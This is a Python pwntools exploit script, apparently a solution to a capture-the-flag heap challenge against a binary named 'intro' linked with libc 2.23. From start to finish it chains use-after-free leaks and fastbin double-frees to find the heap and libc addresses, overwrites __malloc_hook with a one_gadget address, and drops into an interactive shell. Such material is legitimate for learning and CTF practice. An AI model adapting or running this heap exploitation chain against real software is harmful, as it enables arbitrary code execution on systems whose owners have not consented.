from pwn import * 


elf = ELF("./intro")
libc = ELF("./libc-2.23.so") 
context.terminal = ['tmux', 'splitw', '-h'] 

def get_PIE(r): 
    with open("/proc/%d/maps" % (r.pid)) as f: 
        maps = f.readlines() 
    base = maps[0].split("-")[0] 
    return int(base, 16) 

if (args.GDB): 
    r = process('./intro')#, env={"LD_PRELOAD": "./libc-2.23.so"} ) 
    log.success("PIE base %s" % (hex(get_PIE(r))))
    gdb.attach(r) 
else: 
    r = process('./intro')# , env={"LD_PRELOAD": "./libc-2.23.so"} ) 
base = get_PIE(r) 
log.success("Storage array: %s" % hex(base + 0x00202060)) 

@atexception.register
def handler():
    log.error(r.recv()) 
with context.local(log_level = 'error'):
      atexception.register(handler)

def menu(): 
    r.recvuntil("> ") 
def alloc(index, size, data): 
    menu() 
    r.sendline(b'1') 
    r.recvline() 
    r.sendline(str(index).encode()) 
    r.recvline() 
    r.sendline(str(size).encode()) 
    r.recvline() 
    r.send(data)
def show(index): 
    menu() 
    r.sendline(b'2') 
    r.recvline() 
    r.sendline(str(index).encode()) 
    return r.recvuntil('1')[:-1] 
def delete(index): 
    menu() 
    r.sendline(b'3')
    r.recvline() 
    r.sendline(str(index).encode()) 

alloc(0, 0x50, b'A'*0x48 + p64(0x61)) 
alloc(1, 0x50, b'B'*0x50) 
alloc(2, 0x50, b'C'*0x50 ) 
delete(0) 
delete(1)
delete(2) 
data = u64(show(2).ljust(8, b'\x00'))

log.success("Heap leak: %s" % (hex(data)))


alloc(0, 0x50, b'A'*0x50) 
alloc(1, 0x50, b'B'*0x50) 

# Double-free for arbitrary-write 
delete(0) 
delete(1) 
delete(0)

 
#pause() 
alloc(0, 0x50, p64(data-0x10)+p64(data - 0x10)) #write data-0x10 to the freelist 

alloc(1, 0x50, b'C'*0x10 + b'B'*0x10) 
alloc(2, 0x50, b'D'*40 + p64(0x31))
#pause()  
alloc(3, 0x50, p64(0x0) + p64(0x91)) 
delete(1) 
 
libc.address = u64(show(1).ljust(8, b'\x00')) - (libc.symbols['main_arena'] + 88) 

log.success('libc leak %s' % (hex(libc.address)))
log.success('libc system %s' % (hex(libc.symbols['system']))) 
log.success('malloc hook %s' % (hex(libc.symbols['__malloc_hook']))) 
log.success('main arena %s' % (hex(libc.symbols['main_arena']))) 
alloc(0, 0x68, b'A') 
alloc(1, 0x68, b'B') 

delete(0) 
delete(1) 
delete(0) 

alloc(0, 0x68, p64(libc.symbols['__malloc_hook'] - 0x23)) 

alloc(1, 0x68, b'A') 

alloc(2, 0x68, b'B') 
one_gadget = 0xd5bf7 + libc.address 
alloc(3, 0x68, b'A'*0x13 + p64(one_gadget)) 

menu() 
 
r.sendline(b'1') 
r.recvline() 
r.sendline(b'0') 
r.recvline() 

r.sendline(b'10') 

r.interactive( )




